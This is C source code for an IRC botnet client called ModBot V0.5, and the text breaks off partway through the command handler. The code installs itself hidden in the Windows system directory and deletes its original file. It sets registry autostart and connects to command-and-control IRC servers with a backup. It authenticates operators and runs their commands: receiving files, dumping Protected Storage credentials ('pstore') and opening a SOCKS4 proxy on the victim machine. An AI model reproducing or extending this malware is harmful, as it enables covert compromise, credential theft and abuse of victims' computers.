/////////////////////////////////////////////////
//            120|-[ModBot]-V0.5               //
///////////////////////////////////////////////// 
#include "Inc.h"
#include "Fun.h"
#include "Conf.h"
#include "Cmd.h"
#include "Glo.h"
#include "Ext.h"
//////////////////////////////////////////////////////////////////////////////////
char AIMmesg[512];
//////////////////////////////////////////////////////////////////////////////////
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char logbuf[LOGLINE],fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],sysdir[MAX_PATH];

	int i = 0, err = 0;
	DWORD id=0;
	BOOL bkpserver = FALSE;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_EHANDLER

	DWORD handler = (DWORD)_except_handler;
	_asm
    {                           
        push    handler         
        push    FS:[0]          
        mov     FS:[0],ESP      
    }
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	started = GetTickCount() / 1000;
	srand(GetTickCount());
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_LOGGING
	opendebuglog();
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_CRYPT 
	decryptstrings((sizeof(authost) / sizeof(LPTSTR)), (sizeof(versionlist) / sizeof(LPTSTR)));
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	LoadDLLs(); 

	fSetErrorMode(SEM_NOGPFAULTERRORBOX);

	if (WaitForSingleObject(CreateMutex(NULL, FALSE, botid), 60000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0) 
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		return 0;
	}

	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (i=0;(unsigned int)i < (strlen(filename) - 4);i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s", sysdir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; 
				Sleep(15000);
			} else
				break; 
		}
		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_CONSOLE
		sinfo.wShowWindow = SW_SHOW;
#else
		sinfo.wShowWindow = SW_HIDE;
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////		
		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_CONSOLE
	OpenConsole();
	printf("Debugging console enabled.\n\n");
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_MELT
	if (__argc > 2) {
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(2000);  
			DeleteFile(__argv[2]);
		}
	}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	if ((AutoStart) && !(noadvapi32)) 
		AutoStartRegs(rfilename);

        sprintf(logbuf,"%s Bot started", mn_title);
	addthread(logbuf,MAIN_THREAD,NULL);
	addlog(logbuf);

	memset(aliases, 0, sizeof(aliases));
	addpredefinedaliases();
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_REGISTRY
	sprintf(logbuf,"%s Registry monitor active", mn_title);
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistry, (LPVOID)&rfilename, 0, &id)) == NULL)
		sprintf(logbuf,"%s Failed to start registry thread, error %d", mn_title, GetLastError());
	addlog(logbuf);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_SECSYSTEM
	sprintf(logbuf,"%s System secure monitor active",  mn_title);
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoSecure, NULL, 0, &id)) == NULL)
		sprintf(logbuf,"%s Failed to start secure thread, error %d ",  mn_title, GetLastError());
	addlog(logbuf);
#endif
//////////////////////////////////////////////////////////////////////////////////
//#ifndef NO_AIM
//	EnumWindows(EnumAIM, 0);
//#endif
//////////////////////////////////////////////////////////////////////////////////
    current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist));

	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_CONNCHECK
			DWORD cstat;
			if (!nowininet) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			success = FALSE;
			if ((err = irc_connect((LPVOID)&mainirc)) == 2) 
				break; 

			if (success) i--; 

			Sleep(3000);
		}

		if (err == 2) break; 

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	killthreadall();
	fWSACleanup();

	return 0;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;

	char *nick1, nickbuf[MAXNICKLEN];

	int rval;

	IRC irc = *((IRC *)param);
	IRC *ircs = (IRC *)param;
	ircs->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned int)irc.port);
		if ((ssin.sin_addr.s_addr=ResolveAddress(irc.host)) == 0) 
			return 0;

		memset(nickbuf, 0, sizeof(nickbuf));
		nick1 = rndnick(nickbuf, nicktype, nickprefix);
		strncpy(threads[irc.threadnum].nick, nick1, sizeof(threads[irc.threadnum].nick)-1);

		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		threads[irc.threadnum].sock = sock;
		if (fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(sock);
			FlushDNSCache();
			Sleep(2000);
			continue;
		}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_CONSOLE
		printf("Bot started and connect to %s.\n", irc.host);
#endif
		addlogv("Connected to %s",irc.host);

		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, irc.spy);
		fclosesocket(sock);

		if (rval == 0) 
			continue;
		else if (rval == 1) {	
			Sleep(900000);
			continue;
		}
		else if (rval == 2) 
			break;	
	}
	clearthread(irc.threadnum);

	return rval;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy)
{
	char buffer[4096], masters[MAXLOGINS][128], *lines[MAX_LINES], str[18], login[128], host[160];
	int i, j, repeat, in_channel=0;

	for (i = 0; i < MAXLOGINS; i++)
		masters[i][0] = '\0';

	if (serverpass[0] != '\0')
		irc_sendv(sock,"PASS %s\r\n",serverpass);

 	sprintf(login, "NICK %s\r\n"
		"USER %s 0 0 :%s\r\n", nick1, rndnick(str,LETTERNICK, FALSE), nick1);
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_LOGGING
	debuglog(login,FALSE);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	if (fsend(sock, login, strlen(login), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	while(1) {
		memset(buffer, 0, sizeof(buffer));
		if (frecv(sock, buffer, sizeof(buffer), 0) <= 0) 
			break;
		
		i = Split(buffer,&lines);
		for (j=0;j < i;j++) {
			repeat=1;
			do {
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_LOGGING
				debuglog(lines[j]);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
				repeat = irc_parseline(lines[j], sock, channel, chanpass, nick1, server, masters, host, &in_channel, repeat, spy);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat > 0);

			switch (repeat) {
			case -1:
				return 0; 
			case -2:
				return 1; 
			case -3:
				return 2; 
			default:
				break;
			}
		}
	}

	return 0;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE],ntmp[12], ntmp2[3];
	char *a[MAXTOKENS], a0[128], nick[MAXNICKLEN], user[24];
	unsigned char parameters[256];

	int i, ii, s=3;
	DWORD id=0;
	BOOL ismaster = FALSE, silent = FALSE, notice = FALSE, usevars = FALSE;
    
	memset(sendbuf, 0, sizeof(sendbuf));

	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < MAXTOKENS; i++) 
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) 
		return 1;

	memset(parameters,0,sizeof(parameters));
	for (i=31;i>=0;i--) {
		if (!a[i]) 
			continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			parameters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else 
			break;
	}
	if (parameters['s']) 
		silent=TRUE;
	if (parameters['n']) {
		silent=FALSE;
		notice=TRUE;
	}
	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		irc_sendv(sock, "PONG %s\r\n", a[1]);
		if (*in_channel == 0)
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);

		return 1;
	}
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendv(sock, "USERHOST %s\r\n", nick1); 
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
		
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_MODEONCONN
		irc_sendv(sock, "MODE %s %s\r\n", nick1, modeonconn);
#else
		irc_sendv(sock, "MODE %s +i\r\n", nick1);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
		irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		success = TRUE;
		return 1;
	}
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) 
			strncpy(host,  h+1, 159);
		return 1;
	}
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1, nicktype, nickprefix);
		irc_sendv(sock, "NICK %s\r\n", nick1);
		return 1;
	}
	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a0) == 0)
			ismaster = TRUE;
	}
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) 
				if (strcmp(knick, a[3]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf,"%s User %s logged out",  mn_title, knick);
					irc_sendv(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
					addlog(sendbuf);
				}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}
	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user, *newnck = a[2] + 1;
		for (i=0;i<MAXLOGINS;i++) {
			if (strcmp(masters[i],a0) == 0) {
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if(oldnck != NULL && newnck != NULL) {
			if(strcmp(oldnck, nick1) == 0) {
				strncpy(nick1, newnck, 15);
				return 1;
			}
			char debugbuf[100];
			for (i = 0; i < MAXLOGINS; i++) {
				if(masters[i][0] != '\0' && strcmp(masters[i], a0) == 0) {
					char *ih = strchr(a0, '!');
					if(ih == NULL || strlen(newnck) + strlen(ih) > 126) 
						return 1;
					sprintf(masters[i], ":%s%s", newnck, ih);
					irc_privmsg(sock, channel, debugbuf, FALSE);
					break;
				}
			}
		}

		return 1;
	}
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "%s User: %s logged out",  mn_title, user);
					addlog(sendbuf);
					if (strcmp("PART", a[1]) == 0) 
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
					return 1;
				}
			}
		}
	}

	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) 
			*in_channel = 1;
		addlogv("Joined channel: %s",a[4]);
		return 1;
	}

	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	
			if (strcmp("NOTICE", a[1]) == 0) 
				notice = TRUE;
			if (a[2] == NULL) return 1;
	
			if (strstr(a[2], "#") == NULL || notice) 
				a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			if (a[3] && nick1)
				if (strncmp(nick, a[3], strlen(nick)) == 0) 
					s = 4; 
				else 
					s = 3;
			if (a[s] == NULL) return 1;
			if (strcmp("\1VERSION\1", a[s]) == 0) 
				if (a[2][0] != '#' && versionlist[current_version][0] != '\0') {
					irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);
					return 1;
				}
			else if (strcmp("\1PING", a[s]) == 0) 
				if (a[s+1] != NULL && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
					return 1;
				}
		} else  { 
			s = 4;
			a[4]++;
			a[2] = a[3];
		}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_DCC
		if (strcmp("\1DCC", a[s]) == 0) { 
			if (strcmp("SEND", a[s+1]) == 0) {
				if (ismaster) {
					DCC dcc;
					sprintf(dcc.filename,"%s",a[s+2]);
					sprintf(dcc.host,"%s",a[s+3]);
					dcc.port = atoi(a[s+4]);
					dcc.sock = sock;
					strncpy(dcc.sendto,user,sizeof(dcc.sendto)-1);
					dcc.notice = notice;
					dcc.silent = silent;

					sprintf(sendbuf, "%s Receive file: '%s' from user: %s.",  mn_title, dcc.filename,dcc.sendto);
					dcc.threadnum=addthread(sendbuf,DCC_THREAD,NULL);
					if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCGetThread, (LPVOID)&dcc, 0, &id)) {
						while (dcc.gotinfo == FALSE) 
							Sleep(50);
					} else 
						sprintf(sendbuf,"%s Failed to start transfer thread, error %d",  mn_title, GetLastError());
				} else 
					sprintf(sendbuf, "%s Receive file: '%s' failed from unauthorized user: %s.",  mn_title, a[s+2], user);
				addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp("CHAT", a[s+1]) == 0) {
				if (ismaster) {
					if (findthreadid(DCCCHAT_THREAD) == 0) {
						DCC dcc;
						sprintf(dcc.host,"%s",a[s+3]);
						dcc.port = atoi(a[s+4]);
						dcc.sock = sock;
						strncpy(dcc.sendto,user,sizeof(dcc.sendto)-1);
						dcc.notice = notice;
						dcc.silent = silent;

						sprintf(sendbuf, "%s Chat from user: %s",  mn_title, user);
						dcc.threadnum=addthread(sendbuf,DCCCHAT_THREAD,NULL);
						if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCChatThread, (LPVOID)&dcc, 0, &id)) {
							while (dcc.gotinfo == FALSE) 
								Sleep(50);
						} else
							sprintf(sendbuf,"%s Failed to start chat thread, error %d",  mn_title, GetLastError());
					} else
						sprintf(sendbuf,"%s Chat already active with user: %s", mn_title, user);
				} else
					sprintf(sendbuf,"%s Chat failed by unauthorized user: %s", mn_title, user);
				addlog(sendbuf);

				return 1;
			}
		} else
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
		if (a[s]++[0] != prefix) 
			return 1;
#ifdef DEBUG_CRYPT	
#ifndef NO_CRYPT
		if (strcmp("dump", a[s]) == 0) {
			if (a[s+1]) {
				irc_sendv(sock, "NOTICE %s : Id = '%s'\r\n",user,botid); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Version = '%s'\r\n",user,version); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Server = '%s'\r\n",user,server); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Channel = '%s'\r\n",user,channel); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Nickconst = '%s'\r\n",user,nickconst); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Authost = '%s'\r\n",user,authost[0]);
				irc_sendv(sock, "NOTICE %s : Password(before) = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(password,strlen(password));
				irc_sendv(sock, "NOTICE %s : Password = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(password,strlen(password));
				irc_sendv(sock, "NOTICE %s : Password(enc) = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(a[s+1],strlen(a[s+1]));
				irc_sendv(sock, "NOTICE %s : Password(arg) = '%s'\r\n",user,a[s+1]); Sleep(FLOOD_DELAY);
			}

			return 1;
		}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#endif
		if (strcmp(login_cmd, a[s]) == 0) {
			if (a[s+1] == NULL || ismaster) 
				return 1;

			char *u = strtok(a[0], "!") + 1, *h = strtok(NULL, "\0");
			h = strtok(h, "~");
#ifndef NO_CRYPT
			Crypt(a[s+1],strlen(a[s+1]),"",0); 
#endif
			if (strcmp(password, a[s+1]) != 0) {
				irc_sendv(sock, "NOTICE %s :Pass auth failed (%s!%s).\r\n", user, user, h);
				irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
				sprintf(sendbuf, "%s *Failed pass auth by: (%s!%s)",  mn_title, u, h);
				addlog(sendbuf);
				return 1; 
			}
	
			BOOL host_ok=FALSE;
			for (i=0;i<(sizeof(authost) / sizeof(LPTSTR));i++) {
#ifndef NO_WILDCARD
				if (wildcardfit(authost[i], h)) { 
					host_ok = TRUE;
					break;
				}
#else
				if (strcmp(h, authost[i]) == 0) {
					host_ok = TRUE;
					break;
				}
#endif
			}
 			if (!host_ok) {
 				irc_sendv(sock, "NOTICE %s :Host Auth failed (%s!%s).\r\n", user, user, h);
 				irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
 				sprintf(sendbuf, "%s *Failed host auth by: (%s!%s)",  mn_title, u, h);
 				addlog(sendbuf);
 				return 1;
			}
			for (i = 0; i < MAXLOGINS; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "My Master", notice);
					addlogv("User: %s logged in", user);
					break;
				}
			}
			return 1;
		}
		if ((ismaster || strcmp("332", a[1]) == 0) && spy == 0) {
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix;
					sc[3] = prefix;
					strncpy(sc+4, aliases[i].command, 159);

					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) 
							replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}
			if (a[s][0] == prefix || usevars) {
				replacestr(line, "$me", nick1); 
				replacestr(line, "$user", user); 
				replacestr(line, "$chan", a[2]); 
				replacestr(line, "$rndnick", rndnick(ntmp)); 
				replacestr(line, "$server", server); 

				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57) 
						strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) 
						ntmp2[0] = (char)atoi(ntmp); 
					else 
						ntmp2[0] = (char)((rand()%96) + 32);
					ntmp2[1] = '\0';
					ii = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, ii+6);
					replacestr(line, ntmp, ntmp2);
				}

				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) 
					a[i] = strtok(NULL, " ");
				if (a[s] == NULL) 
					return 1;
				a[s] += 3;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			if (strcmp(randomnick_cmd, a[s]) == 0) {
				rndnick(nick, nicktype, ((parameters['p'])?(TRUE):(FALSE)), a[s+1]);
				irc_sendv(sock, "NICK %s\r\n", nick);

				addlogv("%s Random nick change: %s",mn_title,nick);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(die_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) {
#ifdef DEBUG_LOGGING
					closedebuglog();
#endif
					killthreadall();
					ExitProcess(EXIT_SUCCESS);
				}
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(logout_cmd, a[s]) == 0) {
				if (a[s+1]) {
					i = atoi(a[s+1]);
					if(i >= 0 && i < MAXLOGINS) {
    					if(masters[i][0] != '\0') {
        					sprintf(sendbuf, "%s User %s logged out.",  mn_title, masters[i]+1);
        					masters[i][0] = '\0';
        				} else
        					sprintf(sendbuf, "%s No user logged in at slot: %d",  mn_title, i);
					} else
						sprintf(sendbuf, "%s Invalid login slot number: %d",  mn_title, i);				
				} else {
					for (i = 0; i < MAXLOGINS; i++) 
						if (strcmp(masters[i], a[0]) == 0) {
							masters[i][0] = '\0';
							sprintf(sendbuf, "%s User %s logged out",  mn_title, user);
							break;
						}
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_BOTVERSION
			else if (strcmp(version_cmd, a[s]) == 0) {
				sprintf(sendbuf, "%s %s",  mn_title, version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp("pstore", a[s]) == 0 || strcmp ("ps", a[s]) == 0) {
				pststrct pStorInfo;
				pStorInfo.sock = sock;
				strcpy(pStorInfo.chan,a[2]);
				sprintf(sendbuf, "Executed pstore",  mn_title, version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				CreateThread(NULL, 0, &pstore, (LPVOID)&pStorInfo, 0, 0);
			}
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_SOCK4SERV
			else if (strcmp("socks4", a[s]) == 0 || strcmp("s4", a[s]) == 0) {
				SOCKS4 socks4;
				socks4.port = ((a[s+1])?((atoi(a[s+1])==0)?(socks4port):(atoi(a[s+1]))):(socks4port));
				((a[s+2])?(_snprintf(socks4.userid,sizeof(socks4.userid),a[s+2])):
					((parameters['a'])?(_snprintf(socks4.userid,sizeof(socks4.userid),user)):(socks4.userid[0]='\0')));
				socks4.sock = sock;
				socks4.notice = notice;
				socks4.silent = silent;
				_snprintf(socks4.chan,sizeof(socks4.chan),a[2]);

				sprintf(sendbuf, "[SOCKS4]: Server started on: %s:%d.", GetIP(sock), socks4.port);
				socks4.threadnum=addthread(sendbuf,SOCKS4_THREAD,NULL);
				if (threads[socks4.threadnum].tHandle = CreateThread(NULL, 0, &Socks4Thread, (LPVOID)&socks4, 0, &id)) {
					while(socks4.gotinfo == FALSE)
						Sleep(50);
				} else
					addlogv("[SOCKS4]: Failed to start server thread, error: <%d>.", GetLastError());

				return 1;
			}
			else if (strcmp("socks4stop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[SOCKS4]","Server",SOCKS4_THREAD,a[s+1]);

				return 1;
			}
			#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_SPEEDTEST
			else if (strcmp(speedtest_cmd, a[s]) == 0) {
				DoSpeedTest(sock, a[2], notice);
				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

#ifndef NO_SECURE
			else if (strcmp(secure_cmd, a[s]) == 0 
				|| strcmp(unsecure_cmd, a[s]) == 0) {
				SECURE secure;
				secure.secure = (strcmp(secure_cmd, a[s]) == 0);
				_snprintf(secure.chan, sizeof(secure.chan), a[2]);
				secure.sock = sock;
				secure.notice = notice;
				secure.silent = silent;

				_snprintf(sendbuf, sizeof(sendbuf),"%s %s System",  mn_title, ((secure.secure)?("Securing"):("Unsecuring")));
				secure.threadnum = addthread(sendbuf, SECURE_THREAD, NULL);
